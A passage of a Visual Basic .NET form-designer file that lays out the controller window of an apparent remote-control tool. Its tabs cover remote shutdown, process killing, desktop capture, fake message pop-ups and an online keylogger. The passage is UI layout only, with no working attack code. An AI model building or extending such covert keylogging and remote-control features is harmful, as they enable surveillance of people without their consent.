        Me.gbxAdvancedMode.Name = "gbxAdvancedMode"
        Me.gbxAdvancedMode.Size = New System.Drawing.Size(180, 68)
        Me.gbxAdvancedMode.TabIndex = 12
        Me.gbxAdvancedMode.TabStop = False
        '
        'rdobtnAdvancedModeImmediate
        '
        Me.rdobtnAdvancedModeImmediate.Location = New System.Drawing.Point(10, 42)
        Me.rdobtnAdvancedModeImmediate.Name = "rdobtnAdvancedModeImmediate"
        Me.rdobtnAdvancedModeImmediate.Size = New System.Drawing.Size(164, 16)
        Me.rdobtnAdvancedModeImmediate.TabIndex = 1
        Me.rdobtnAdvancedModeImmediate.Text = "Mode immediate"
        '
        'rdobtnAdvancedModeNormal
        '
        Me.rdobtnAdvancedModeNormal.Checked = True
        Me.rdobtnAdvancedModeNormal.Location = New System.Drawing.Point(10, 20)
        Me.rdobtnAdvancedModeNormal.Name = "rdobtnAdvancedModeNormal"
        Me.rdobtnAdvancedModeNormal.Size = New System.Drawing.Size(164, 16)
        Me.rdobtnAdvancedModeNormal.TabIndex = 0
        Me.rdobtnAdvancedModeNormal.TabStop = True
        Me.rdobtnAdvancedModeNormal.Text = "Mode normal"
        '
        'lblLine5
        '
        Me.lblLine5.BackColor = System.Drawing.Color.White
        Me.lblLine5.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblLine5.Location = New System.Drawing.Point(12, 86)
        Me.lblLine5.Name = "lblLine5"
        Me.lblLine5.Size = New System.Drawing.Size(176, 3)
        Me.lblLine5.TabIndex = 11
        '
        'lblLine4
        '
        Me.lblLine4.BackColor = System.Drawing.Color.White
        Me.lblLine4.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblLine4.Location = New System.Drawing.Point(186, 20)
        Me.lblLine4.Name = "lblLine4"
        Me.lblLine4.Size = New System.Drawing.Size(3, 68)
        Me.lblLine4.TabIndex = 10
        '
        'PictureBox1
        '
        Me.PictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.PictureBox1.Image = CType(resources.GetObject("PictureBox1.Image"), System.Drawing.Bitmap)
        Me.PictureBox1.Location = New System.Drawing.Point(12, 20)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(176, 68)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.PictureBox1.TabIndex = 4
        Me.PictureBox1.TabStop = False
        '
        'rdobtnRestart
        '
        Me.rdobtnRestart.Image = CType(resources.GetObject("rdobtnRestart.Image"), System.Drawing.Bitmap)
        Me.rdobtnRestart.ImageAlign = System.Drawing.ContentAlignment.TopLeft
        Me.rdobtnRestart.Location = New System.Drawing.Point(208, 58)
        Me.rdobtnRestart.Name = "rdobtnRestart"
        Me.rdobtnRestart.Size = New System.Drawing.Size(207, 28)
        Me.rdobtnRestart.TabIndex = 3
        Me.rdobtnRestart.Text = "Restart remote machine"
        Me.rdobtnRestart.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'rdobtnPoweroff
        '
        Me.rdobtnPoweroff.Image = CType(resources.GetObject("rdobtnPoweroff.Image"), System.Drawing.Bitmap)
        Me.rdobtnPoweroff.ImageAlign = System.Drawing.ContentAlignment.TopLeft
        Me.rdobtnPoweroff.Location = New System.Drawing.Point(208, 138)
        Me.rdobtnPoweroff.Name = "rdobtnPoweroff"
        Me.rdobtnPoweroff.Size = New System.Drawing.Size(207, 28)
        Me.rdobtnPoweroff.TabIndex = 2
        Me.rdobtnPoweroff.Text = "    Power off remote machine"
        Me.rdobtnPoweroff.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'rdobtnShutdown
        '
        Me.rdobtnShutdown.Image = CType(resources.GetObject("rdobtnShutdown.Image"), System.Drawing.Bitmap)
        Me.rdobtnShutdown.ImageAlign = System.Drawing.ContentAlignment.TopLeft
        Me.rdobtnShutdown.Location = New System.Drawing.Point(208, 98)
        Me.rdobtnShutdown.Name = "rdobtnShutdown"
        Me.rdobtnShutdown.Size = New System.Drawing.Size(207, 28)
        Me.rdobtnShutdown.TabIndex = 1
        Me.rdobtnShutdown.Text = "    Shutdown remote machine"
        Me.rdobtnShutdown.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'rdobtnLoggOff
        '
        Me.rdobtnLoggOff.Checked = True
        Me.rdobtnLoggOff.Image = CType(resources.GetObject("rdobtnLoggOff.Image"), System.Drawing.Bitmap)
        Me.rdobtnLoggOff.ImageAlign = System.Drawing.ContentAlignment.TopLeft
        Me.rdobtnLoggOff.Location = New System.Drawing.Point(208, 18)
        Me.rdobtnLoggOff.Name = "rdobtnLoggOff"
        Me.rdobtnLoggOff.Size = New System.Drawing.Size(207, 28)
        Me.rdobtnLoggOff.TabIndex = 0
        Me.rdobtnLoggOff.TabStop = True
        Me.rdobtnLoggOff.Text = "  Logg off remote machine"
        Me.rdobtnLoggOff.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        '
        'tabpgeServerToolProcessExplorer
        '
        Me.tabpgeServerToolProcessExplorer.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnRefreshProcessList, Me.lstwProcessList})
        Me.tabpgeServerToolProcessExplorer.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolProcessExplorer.Name = "tabpgeServerToolProcessExplorer"
        Me.tabpgeServerToolProcessExplorer.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolProcessExplorer.TabIndex = 5
        Me.tabpgeServerToolProcessExplorer.Text = "Process explorer"
        '
        'btnRefreshProcessList
        '
        Me.btnRefreshProcessList.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnRefreshProcessList.Location = New System.Drawing.Point(362, 12)
        Me.btnRefreshProcessList.Name = "btnRefreshProcessList"
        Me.btnRefreshProcessList.Size = New System.Drawing.Size(80, 20)
        Me.btnRefreshProcessList.TabIndex = 15
        Me.btnRefreshProcessList.Text = "&Refresh"
        '
        'lstwProcessList
        '
        Me.lstwProcessList.ContextMenu = Me.cntxtmnuProcessExplorer
        Me.lstwProcessList.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lstwProcessList.FullRowSelect = True
        Me.lstwProcessList.GridLines = True
        Me.lstwProcessList.LargeImageList = Me.imglstDriveIcons
        Me.lstwProcessList.Location = New System.Drawing.Point(14, 44)
        Me.lstwProcessList.Name = "lstwProcessList"
        Me.lstwProcessList.Size = New System.Drawing.Size(426, 190)
        Me.lstwProcessList.SmallImageList = Me.imglstDriveIcons
        Me.lstwProcessList.TabIndex = 10
        Me.lstwProcessList.View = System.Windows.Forms.View.Details
        '
        'cntxtmnuProcessExplorer
        '
        Me.cntxtmnuProcessExplorer.MenuItems.AddRange(New System.Windows.Forms.MenuItem() {Me.cntxtmnuProcessExplorerTerminateProcess, Me.cntxtmnuProcessExplorerMnuSeperator1, Me.cntxtmnuProcessExplorerChangePriority})
        '
        'cntxtmnuProcessExplorerTerminateProcess
        '
        Me.cntxtmnuProcessExplorerTerminateProcess.Index = 0
        Me.cntxtmnuProcessExplorerTerminateProcess.Text = "Terminate process"
        '
        'cntxtmnuProcessExplorerMnuSeperator1
        '
        Me.cntxtmnuProcessExplorerMnuSeperator1.Index = 1
        Me.cntxtmnuProcessExplorerMnuSeperator1.Text = "-"
        '
        'cntxtmnuProcessExplorerChangePriority
        '
        Me.cntxtmnuProcessExplorerChangePriority.Index = 2
        Me.cntxtmnuProcessExplorerChangePriority.Text = "Change priority"
        '
        'imglstDriveIcons
        '
        Me.imglstDriveIcons.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
        Me.imglstDriveIcons.ImageSize = New System.Drawing.Size(16, 16)
        Me.imglstDriveIcons.ImageStream = CType(resources.GetObject("imglstDriveIcons.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.imglstDriveIcons.TransparentColor = System.Drawing.Color.Transparent
        '
        'tabpgeServerToolMiniDesktopViewer
        '
        Me.tabpgeServerToolMiniDesktopViewer.Controls.AddRange(New System.Windows.Forms.Control() {Me.lblDesktopRefreshWarning, Me.picboxMiniDesktopViewer})
        Me.tabpgeServerToolMiniDesktopViewer.Location = New System.Drawing.Point(4, 22)
        Me.tabpgeServerToolMiniDesktopViewer.Name = "tabpgeServerToolMiniDesktopViewer"
        Me.tabpgeServerToolMiniDesktopViewer.Size = New System.Drawing.Size(454, 268)
        Me.tabpgeServerToolMiniDesktopViewer.TabIndex = 4
        Me.tabpgeServerToolMiniDesktopViewer.Text = "Remote desktop"
        '
        'lblDesktopRefreshWarning
        '
        Me.lblDesktopRefreshWarning.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblDesktopRefreshWarning.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.lblDesktopRefreshWarning.FlatStyle = System.Windows.Forms.FlatStyle.System
        Me.lblDesktopRefreshWarning.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblDesktopRefreshWarning.Location = New System.Drawing.Point(0, 252)
        Me.lblDesktopRefreshWarning.Name = "lblDesktopRefreshWarning"
        Me.lblDesktopRefreshWarning.Size = New System.Drawing.Size(454, 16)
        Me.lblDesktopRefreshWarning.TabIndex = 2
        Me.lblDesktopRefreshWarning.Text = " Please right click and refresh !"
        Me.lblDesktopRefreshWarning.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'picboxMiniDesktopViewer
        '
        Me.picboxMiniDesktopViewer.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.picboxMiniDesktopViewer.ContextMenu = Me.cntxtmnuMiniDesktopViewer
        Me.picboxMiniDesktopViewer.Location = New System.Drawing.Point(2, 2)
        Me.picboxMiniDesktopViewer.Name = "picboxMiniDesktopViewer"
        Me.picboxMiniDesktopViewer.Size = New System.Drawing.Size(450, 230)
        Me.picboxMiniDesktopViewer.TabIndex = 0
        Me.picboxMiniDesktopViewer.TabStop = False
        '
        'cntxtmnuMiniDesktopViewer
        '
        Me.cntxtmnuMiniDesktopViewer.MenuItems.AddRange(New System.Windows.Forms.MenuItem() {Me.cntxtmnuMiniDesktopViewerRefresh, Me.cntxtmnuSeperator1, Me.cntxtmnuMiniDesktopViewerToggleFullView, Me.cntxtmnuSeperator3, Me.cntxtmnuMiniDesktopViewerLoadNormalImage, Me.cntxtmnuSeperator4, Me.cntxtmnuMiniDesktopViewerLoadCompressedImage, Me.cntxtmnuSeperator5, Me.cntxtmnuMiniDesktopViewerSaveAsNormal, Me.cntxtmnuSeperator6, Me.cntxtmnuMiniDesktopViewerSaveAsCompressed})
        '
        'cntxtmnuMiniDesktopViewerRefresh
        '
        Me.cntxtmnuMiniDesktopViewerRefresh.Index = 0
        Me.cntxtmnuMiniDesktopViewerRefresh.Text = "Refresh desktop image"
        '
        'cntxtmnuSeperator1
        '
        Me.cntxtmnuSeperator1.Index = 1
        Me.cntxtmnuSeperator1.Text = "-"
        '
        'cntxtmnuMiniDesktopViewerToggleFullView
        '
        Me.cntxtmnuMiniDesktopViewerToggleFullView.Index = 2
        Me.cntxtmnuMiniDesktopViewerToggleFullView.Text = "Toggle full desktop view"
        '
        'cntxtmnuSeperator3
        '
        Me.cntxtmnuSeperator3.Index = 3
        Me.cntxtmnuSeperator3.Text = "-"
        '
        'cntxtmnuMiniDesktopViewerLoadNormalImage
        '
        Me.cntxtmnuMiniDesktopViewerLoadNormalImage.Index = 4
        Me.cntxtmnuMiniDesktopViewerLoadNormalImage.Text = "Load normal image"
        '
        'cntxtmnuSeperator4
        '
        Me.cntxtmnuSeperator4.Index = 5
        Me.cntxtmnuSeperator4.Text = "-"
        '
        'cntxtmnuMiniDesktopViewerLoadCompressedImage
        '
        Me.cntxtmnuMiniDesktopViewerLoadCompressedImage.Index = 6
        Me.cntxtmnuMiniDesktopViewerLoadCompressedImage.Text = "Load compressed image"
        '
        'cntxtmnuSeperator5
        '
        Me.cntxtmnuSeperator5.Index = 7
        Me.cntxtmnuSeperator5.Text = "-"
        '
        'cntxtmnuMiniDesktopViewerSaveAsNormal
        '
        Me.cntxtmnuMiniDesktopViewerSaveAsNormal.Index = 8
        Me.cntxtmnuMiniDesktopViewerSaveAsNormal.Text = "Save as normal image"
        '
        'cntxtmnuSeperator6
        '
        Me.cntxtmnuSeperator6.Index = 9
        Me.cntxtmnuSeperator6.Text = "-"
        '
        'cntxtmnuMiniDesktopViewerSaveAsCompressed
        '
        Me.cntxtmnuMiniDesktopViewerSaveAsCompressed.Index = 10
        Me.cntxtmnuMiniDesktopViewerSaveAsCompressed.Text = "Save as compressed image"
        '
        'tabpgeServerToolFakeMessenger
        '
        Me.tabpgeServerToolFakeMessenger.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnSend, Me.txtMsgText, Me.txtMsgCaption, Me.lblMsgText, Me.lblMsgCaption, Me.lblMsgLevel, Me.Panel1})
        Me.tabpgeServerToolFakeMessenger.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolFakeMessenger.Name = "tabpgeServerToolFakeMessenger"
        Me.tabpgeServerToolFakeMessenger.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolFakeMessenger.TabIndex = 2
        Me.tabpgeServerToolFakeMessenger.Text = "Fake messager"
        '
        'btnSend
        '
        Me.btnSend.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnSend.Location = New System.Drawing.Point(362, 12)
        Me.btnSend.Name = "btnSend"
        Me.btnSend.Size = New System.Drawing.Size(80, 20)
        Me.btnSend.TabIndex = 14
        Me.btnSend.Text = "&Send"
        '
        'txtMsgText
        '
        Me.txtMsgText.Location = New System.Drawing.Point(14, 134)
        Me.txtMsgText.Multiline = True
        Me.txtMsgText.Name = "txtMsgText"
        Me.txtMsgText.Size = New System.Drawing.Size(426, 100)
        Me.txtMsgText.TabIndex = 13
        Me.txtMsgText.Text = ""
        '
        'txtMsgCaption
        '
        Me.txtMsgCaption.Location = New System.Drawing.Point(16, 86)
        Me.txtMsgCaption.Name = "txtMsgCaption"
        Me.txtMsgCaption.Size = New System.Drawing.Size(426, 20)
        Me.txtMsgCaption.TabIndex = 12
        Me.txtMsgCaption.Text = ""
        '
        'lblMsgText
        '
        Me.lblMsgText.Location = New System.Drawing.Point(16, 118)
        Me.lblMsgText.Name = "lblMsgText"
        Me.lblMsgText.Size = New System.Drawing.Size(132, 16)
        Me.lblMsgText.TabIndex = 11
        Me.lblMsgText.Text = "Message text"
        '
        'lblMsgCaption
        '
        Me.lblMsgCaption.Location = New System.Drawing.Point(15, 70)
        Me.lblMsgCaption.Name = "lblMsgCaption"
        Me.lblMsgCaption.Size = New System.Drawing.Size(132, 16)
        Me.lblMsgCaption.TabIndex = 10
        Me.lblMsgCaption.Text = "Message caption"
        '
        'lblMsgLevel
        '
        Me.lblMsgLevel.Location = New System.Drawing.Point(15, 12)
        Me.lblMsgLevel.Name = "lblMsgLevel"
        Me.lblMsgLevel.Size = New System.Drawing.Size(86, 16)
        Me.lblMsgLevel.TabIndex = 9
        Me.lblMsgLevel.Text = "Message level"
        '
        'Panel1
        '
        Me.Panel1.Controls.AddRange(New System.Windows.Forms.Control() {Me.rdobtnMsgExln, Me.rdobtnMsgInfo, Me.rdobtnMsgStop, Me.rdobtnMsgQstn})
        Me.Panel1.Location = New System.Drawing.Point(10, 26)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(286, 42)
        Me.Panel1.TabIndex = 8
        '
        'rdobtnMsgExln
        '
        Me.rdobtnMsgExln.CheckAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.rdobtnMsgExln.Image = CType(resources.GetObject("rdobtnMsgExln.Image"), System.Drawing.Bitmap)
        Me.rdobtnMsgExln.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.rdobtnMsgExln.Location = New System.Drawing.Point(220, 8)
        Me.rdobtnMsgExln.Name = "rdobtnMsgExln"
        Me.rdobtnMsgExln.Size = New System.Drawing.Size(42, 24)
        Me.rdobtnMsgExln.TabIndex = 11
        '
        'rdobtnMsgInfo
        '
        Me.rdobtnMsgInfo.CheckAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.rdobtnMsgInfo.Checked = True
        Me.rdobtnMsgInfo.Image = CType(resources.GetObject("rdobtnMsgInfo.Image"), System.Drawing.Bitmap)
        Me.rdobtnMsgInfo.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.rdobtnMsgInfo.Location = New System.Drawing.Point(150, 8)
        Me.rdobtnMsgInfo.Name = "rdobtnMsgInfo"
        Me.rdobtnMsgInfo.Size = New System.Drawing.Size(42, 24)
        Me.rdobtnMsgInfo.TabIndex = 10
        Me.rdobtnMsgInfo.TabStop = True
        '
        'rdobtnMsgStop
        '
        Me.rdobtnMsgStop.CheckAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.rdobtnMsgStop.Image = CType(resources.GetObject("rdobtnMsgStop.Image"), System.Drawing.Bitmap)
        Me.rdobtnMsgStop.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.rdobtnMsgStop.Location = New System.Drawing.Point(80, 8)
        Me.rdobtnMsgStop.Name = "rdobtnMsgStop"
        Me.rdobtnMsgStop.Size = New System.Drawing.Size(42, 24)
        Me.rdobtnMsgStop.TabIndex = 9
        '
        'rdobtnMsgQstn
        '
        Me.rdobtnMsgQstn.CheckAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.rdobtnMsgQstn.Image = CType(resources.GetObject("rdobtnMsgQstn.Image"), System.Drawing.Bitmap)
        Me.rdobtnMsgQstn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.rdobtnMsgQstn.Location = New System.Drawing.Point(8, 8)
        Me.rdobtnMsgQstn.Name = "rdobtnMsgQstn"
        Me.rdobtnMsgQstn.Size = New System.Drawing.Size(42, 24)
        Me.rdobtnMsgQstn.TabIndex = 8
        '
        'tabpgeServerToolEnvmt
        '
        Me.tabpgeServerToolEnvmt.Controls.AddRange(New System.Windows.Forms.Control() {Me.lstwDrives, Me.lblLine3, Me.lblOsExtratxt, Me.lblOstxt, Me.lblOsExtra, Me.lblOs})
        Me.tabpgeServerToolEnvmt.Location = New System.Drawing.Point(4, 22)
        Me.tabpgeServerToolEnvmt.Name = "tabpgeServerToolEnvmt"
        Me.tabpgeServerToolEnvmt.Size = New System.Drawing.Size(454, 268)
        Me.tabpgeServerToolEnvmt.TabIndex = 1
        Me.tabpgeServerToolEnvmt.Text = "Environment"
        '
        'lstwDrives
        '
        Me.lstwDrives.ContextMenu = Me.cntxtmnuDriveExplorer
        Me.lstwDrives.FullRowSelect = True
        Me.lstwDrives.LargeImageList = Me.imglstDriveIcons
        Me.lstwDrives.Location = New System.Drawing.Point(14, 94)
        Me.lstwDrives.Name = "lstwDrives"
        Me.lstwDrives.Size = New System.Drawing.Size(426, 140)
        Me.lstwDrives.SmallImageList = Me.imglstDriveIcons
        Me.lstwDrives.TabIndex = 9
        Me.lstwDrives.View = System.Windows.Forms.View.Details
        '
        'cntxtmnuDriveExplorer
        '
        Me.cntxtmnuDriveExplorer.MenuItems.AddRange(New System.Windows.Forms.MenuItem() {Me.cntxtmnuDriveExplorerProperties})
        '
        'cntxtmnuDriveExplorerProperties
        '
        Me.cntxtmnuDriveExplorerProperties.Index = 0
        Me.cntxtmnuDriveExplorerProperties.Text = "Properties"
        '
        'lblLine3
        '
        Me.lblLine3.BackColor = System.Drawing.Color.White
        Me.lblLine3.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblLine3.Location = New System.Drawing.Point(15, 75)
        Me.lblLine3.Name = "lblLine3"
        Me.lblLine3.Size = New System.Drawing.Size(426, 3)
        Me.lblLine3.TabIndex = 8
        '
        'lblOsExtratxt
        '
        Me.lblOsExtratxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblOsExtratxt.Location = New System.Drawing.Point(111, 36)
        Me.lblOsExtratxt.Name = "lblOsExtratxt"
        Me.lblOsExtratxt.Size = New System.Drawing.Size(330, 21)
        Me.lblOsExtratxt.TabIndex = 7
        Me.lblOsExtratxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblOstxt
        '
        Me.lblOstxt.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.lblOstxt.Location = New System.Drawing.Point(111, 12)
        Me.lblOstxt.Name = "lblOstxt"
        Me.lblOstxt.Size = New System.Drawing.Size(330, 21)
        Me.lblOstxt.TabIndex = 6
        Me.lblOstxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblOsExtra
        '
        Me.lblOsExtra.Location = New System.Drawing.Point(15, 36)
        Me.lblOsExtra.Name = "lblOsExtra"
        Me.lblOsExtra.Size = New System.Drawing.Size(95, 21)
        Me.lblOsExtra.TabIndex = 5
        Me.lblOsExtra.Text = "Extra details"
        Me.lblOsExtra.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'lblOs
        '
        Me.lblOs.Location = New System.Drawing.Point(15, 12)
        Me.lblOs.Name = "lblOs"
        Me.lblOs.Size = New System.Drawing.Size(95, 21)
        Me.lblOs.TabIndex = 4
        Me.lblOs.Text = "Operating system"
        Me.lblOs.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
        '
        'tabpgeServerToolChatRoom
        '
        Me.tabpgeServerToolChatRoom.Controls.AddRange(New System.Windows.Forms.Control() {Me.txtChatClientReadOnly, Me.btnClearServer, Me.btnChatExitSession, Me.btnChatStartSession, Me.txtChatClient})
        Me.tabpgeServerToolChatRoom.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolChatRoom.Name = "tabpgeServerToolChatRoom"
        Me.tabpgeServerToolChatRoom.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolChatRoom.TabIndex = 7
        Me.tabpgeServerToolChatRoom.Text = "Chat section"
        '
        'txtChatClientReadOnly
        '
        Me.txtChatClientReadOnly.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtChatClientReadOnly.Location = New System.Drawing.Point(6, 6)
        Me.txtChatClientReadOnly.Multiline = True
        Me.txtChatClientReadOnly.Name = "txtChatClientReadOnly"
        Me.txtChatClientReadOnly.ReadOnly = True
        Me.txtChatClientReadOnly.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtChatClientReadOnly.Size = New System.Drawing.Size(442, 186)
        Me.txtChatClientReadOnly.TabIndex = 18
        Me.txtChatClientReadOnly.Text = ""
        '
        'btnClearServer
        '
        Me.btnClearServer.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnClearServer.Location = New System.Drawing.Point(368, 224)
        Me.btnClearServer.Name = "btnClearServer"
        Me.btnClearServer.Size = New System.Drawing.Size(80, 20)
        Me.btnClearServer.TabIndex = 17
        Me.btnClearServer.Text = "Clear &log"
        '
        'btnChatExitSession
        '
        Me.btnChatExitSession.Enabled = False
        Me.btnChatExitSession.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnChatExitSession.Location = New System.Drawing.Point(88, 224)
        Me.btnChatExitSession.Name = "btnChatExitSession"
        Me.btnChatExitSession.Size = New System.Drawing.Size(80, 20)
        Me.btnChatExitSession.TabIndex = 15
        Me.btnChatExitSession.Text = "Exit session"
        '
        'btnChatStartSession
        '
        Me.btnChatStartSession.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnChatStartSession.Location = New System.Drawing.Point(6, 224)
        Me.btnChatStartSession.Name = "btnChatStartSession"
        Me.btnChatStartSession.Size = New System.Drawing.Size(80, 20)
        Me.btnChatStartSession.TabIndex = 14
        Me.btnChatStartSession.Text = "Start session"
        '
        'txtChatClient
        '
        Me.txtChatClient.Enabled = False
        Me.txtChatClient.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtChatClient.Location = New System.Drawing.Point(6, 192)
        Me.txtChatClient.Multiline = True
        Me.txtChatClient.Name = "txtChatClient"
        Me.txtChatClient.Size = New System.Drawing.Size(442, 28)
        Me.txtChatClient.TabIndex = 0
        Me.txtChatClient.Text = ""
        '
        'tabpgeServerToolFunPlugins
        '
        Me.tabpgeServerToolFunPlugins.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnFlashKeyBoard, Me.btnOpenOrCloseCDRom})
        Me.tabpgeServerToolFunPlugins.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolFunPlugins.Name = "tabpgeServerToolFunPlugins"
        Me.tabpgeServerToolFunPlugins.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolFunPlugins.TabIndex = 8
        Me.tabpgeServerToolFunPlugins.Text = "Fun plugins"
        '
        'btnFlashKeyBoard
        '
        Me.btnFlashKeyBoard.Location = New System.Drawing.Point(15, 48)
        Me.btnFlashKeyBoard.Name = "btnFlashKeyBoard"
        Me.btnFlashKeyBoard.Size = New System.Drawing.Size(419, 28)
        Me.btnFlashKeyBoard.TabIndex = 24
        Me.btnFlashKeyBoard.Tag = "T"
        Me.btnFlashKeyBoard.Text = "Make remote keyboard's lights flashing..."
        '
        'btnOpenOrCloseCDRom
        '
        Me.btnOpenOrCloseCDRom.Location = New System.Drawing.Point(15, 12)
        Me.btnOpenOrCloseCDRom.Name = "btnOpenOrCloseCDRom"
        Me.btnOpenOrCloseCDRom.Size = New System.Drawing.Size(419, 28)
        Me.btnOpenOrCloseCDRom.TabIndex = 23
        Me.btnOpenOrCloseCDRom.Tag = "T"
        Me.btnOpenOrCloseCDRom.Text = "Open remote machine's CD-Rom drive..."
        '
        'tabpgeServerToolRemoteExplorer
        '
        Me.tabpgeServerToolRemoteExplorer.ContextMenu = Me.cntxtmnuBigScreenMode
        Me.tabpgeServerToolRemoteExplorer.Location = New System.Drawing.Point(4, 22)
        Me.tabpgeServerToolRemoteExplorer.Name = "tabpgeServerToolRemoteExplorer"
        Me.tabpgeServerToolRemoteExplorer.Size = New System.Drawing.Size(454, 268)
        Me.tabpgeServerToolRemoteExplorer.TabIndex = 3
        Me.tabpgeServerToolRemoteExplorer.Text = "Remote explorer"
        '
        'cntxtmnuBigScreenMode
        '
        Me.cntxtmnuBigScreenMode.MenuItems.AddRange(New System.Windows.Forms.MenuItem() {Me.cntxtmnuBigScreenModeShowMaximized})
        '
        'cntxtmnuBigScreenModeShowMaximized
        '
        Me.cntxtmnuBigScreenModeShowMaximized.Index = 0
        Me.cntxtmnuBigScreenModeShowMaximized.Text = "Show maximized"
        '
        'tabpgeServerToolClientOnlineKeyLogger
        '
        Me.tabpgeServerToolClientOnlineKeyLogger.Controls.AddRange(New System.Windows.Forms.Control() {Me.btnClearKeyLog, Me.chkboxEnableKeyLogging, Me.btnLoadOfflineKeyLog, Me.txtKeyLog})
        Me.tabpgeServerToolClientOnlineKeyLogger.Location = New System.Drawing.Point(4, 40)
        Me.tabpgeServerToolClientOnlineKeyLogger.Name = "tabpgeServerToolClientOnlineKeyLogger"
        Me.tabpgeServerToolClientOnlineKeyLogger.Size = New System.Drawing.Size(454, 250)
        Me.tabpgeServerToolClientOnlineKeyLogger.TabIndex = 9
        Me.tabpgeServerToolClientOnlineKeyLogger.Text = "keylogger"
        '
        'btnClearKeyLog
        '
        Me.btnClearKeyLog.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnClearKeyLog.Location = New System.Drawing.Point(282, 222)
        Me.btnClearKeyLog.Name = "btnClearKeyLog"
        Me.btnClearKeyLog.Size = New System.Drawing.Size(80, 20)
        Me.btnClearKeyLog.TabIndex = 22
        Me.btnClearKeyLog.Text = "C&lear log"
        '
        'chkboxEnableKeyLogging
        '
        Me.chkboxEnableKeyLogging.Location = New System.Drawing.Point(6, 222)
        Me.chkboxEnableKeyLogging.Name = "chkboxEnableKeyLogging"
        Me.chkboxEnableKeyLogging.Size = New System.Drawing.Size(154, 16)
        Me.chkboxEnableKeyLogging.TabIndex = 21
        Me.chkboxEnableKeyLogging.Text = "&Enable online key logging"
        '
        'btnLoadOfflineKeyLog
        '
        Me.btnLoadOfflineKeyLog.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnLoadOfflineKeyLog.Location = New System.Drawing.Point(368, 222)
        Me.btnLoadOfflineKeyLog.Name = "btnLoadOfflineKeyLog"
        Me.btnLoadOfflineKeyLog.Size = New System.Drawing.Size(80, 20)
        Me.btnLoadOfflineKeyLog.TabIndex = 20
        Me.btnLoadOfflineKeyLog.Text = "&Load key log"
        '
        'txtKeyLog
        '
        Me.txtKeyLog.Font = New System.Drawing.Font("Courier New", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtKeyLog.Location = New System.Drawing.Point(6, 6)
        Me.txtKeyLog.Multiline = True
        Me.txtKeyLog.Name = "txtKeyLog"
        Me.txtKeyLog.ReadOnly = True
        Me.txtKeyLog.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtKeyLog.Size = New System.Drawing.Size(442, 210)
        Me.txtKeyLog.TabIndex = 19
        Me.txtKeyLog.Text = ""
        '
        'btnCancel
        '
        Me.btnCancel.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCancel.Location = New System.Drawing.Point(390, 354)
        Me.btnCancel.Name = "btnCancel"
        Me.btnCancel.Size = New System.Drawing.Size(80, 20)
        Me.btnCancel.TabIndex = 8
        Me.btnCancel.Text = "&Close"
        '
        'imglstIcon32x32
        '
